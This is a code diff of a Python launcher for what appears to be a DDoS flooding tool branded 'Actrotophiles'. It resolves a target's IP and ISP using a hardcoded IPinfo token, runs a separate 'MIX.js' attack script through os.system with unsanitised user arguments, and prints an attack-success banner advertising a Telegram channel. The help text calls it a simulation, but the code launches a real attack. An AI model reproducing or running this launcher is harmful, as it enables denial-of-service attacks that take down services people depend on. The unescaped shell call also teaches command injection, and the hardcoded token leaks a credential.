@@ -1,3 +1,41 @@
+import argparse
+from datetime import datetime
+import socket
+import os
+import ipinfo
+
+# Token API dari IPinfo
+access_token = '40e69d29bf68ac'  # Ganti dengan token IPinfo Anda
+handler = ipinfo.getHandler(access_token)
+
+def clean_url(url):
+    # Hapus protokol (http:// atau https://) dari URL jika ada
+    if url.startswith("http://"):
+        return url[len("http://"):]
+    elif url.startswith("https://"):
+        return url[len("https://"):]
+    return url
+
+def get_ip(domain):
+    try:
+        # Mendapatkan alamat IP dari domain
+        ip_address = socket.gethostbyname(domain)
+        return ip_address
+    except socket.gaierror:
+        return "Unable to get IP address"
+
+def get_isp(ip_address):
+    try:
+        # Mendapatkan informasi ISP dari IPinfo
+        details = handler.getDetails(ip_address)
+        if 'org' in details.all:
+            isp = details.org
+            return isp
+        else:
+            return "ISP not found"
+    except Exception as e:
+        return f"Error: {e}"
+
 def main(url, threads, time):
     current_time = datetime.now().strftime('%Y-%m-%d %H:%M')
 
@@ -15,18 +53,19 @@ def main(url, threads, time):
 
     print(f"   Target Details :")
     print(f"        \x1b[38;2;233;233;233mSTATUS  : [ \x1b[38;2;0;212;14mAttack Successfully Sent By Actrotophiles \x1b[38;2;233;233;233m]")
-    print(f"        \x1b[38;2;233;233;233mTARGET  : [ \x1b[38;2;0;255;255m{args.target} \x1b[38;2;233;233;233m]")
+    print(f"        \x1b[38;2;233;233;233mTARGET  : [ \x1b[38;2;0;255;255m{url} \x1b[38;2;233;233;233m]")
     print(f"        \x1b[38;2;233;233;233mIP      : [ \x1b[38;2;0;255;255m{ip_address} \x1b[38;2;233;233;233m]")
     print(f"        \x1b[38;2;233;233;233mISP     : [ \x1b[38;2;0;255;255m{isp_info} \x1b[38;2;233;233;233m]")
-    print(f"        \x1b[38;2;233;233;233mTHREADS : [ \x1b[38;2;0;255;255m{args.threads} \x1b[38;2;233;233;233m]")
-    print(f"        \x1b[38;2;233;233;233mTIME    : [ \x1b[38;2;0;255;255m{args.time} \x1b[38;2;233;233;233m]")
-    print(f"        \x1b[38;2;233;233;233mMETHOD  : [ \x1b[38;2;0;255;255mRAZ \x1b[38;2;233;233;233m]")
+    print(f"        \x1b[38;2;233;233;233mTHREADS : [ \x1b[38;2;0;255;255m{threads} \x1b[38;2;233;233;233m]")
+    print(f"        \x1b[38;2;233;233;233mTIME    : [ \x1b[38;2;0;255;255m{time} \x1b[38;2;233;233;233m]")
     print(f"   Attack Details :")
     print(f"        \x1b[38;2;233;233;233mSTATUS : [ \x1b[38;2;0;212;14mAttack With 1 Conc \x1b[38;2;233;233;233m]")
     print(f"        \x1b[38;2;233;233;233mHOUR   : [ \x1b[38;2;0;255;255m{current_time} \x1b[38;2;233;233;233m]")
     print(f"        \x1b[38;2;233;233;233mTELE   : [ \x1b[38;2;0;255;255mt.me/neverdowns \x1b[38;2;233;233;233m]")
 
 if __name__ == "__main__":
+    import argparse  # Add the missing import here
+
     parser = argparse.ArgumentParser(description='Simulate an attack command.')
     parser.add_argument('target', type=str, help='URL to attack')
     parser.add_argument('threads', type=int, help='Number of threads to use')
@@ -37,4 +76,3 @@ if __name__ == "__main__":
     os.system(f'node MIX.js {args.target} {args.threads} {args.time}')
     
     main(args.target, args.threads, args.time)
-    
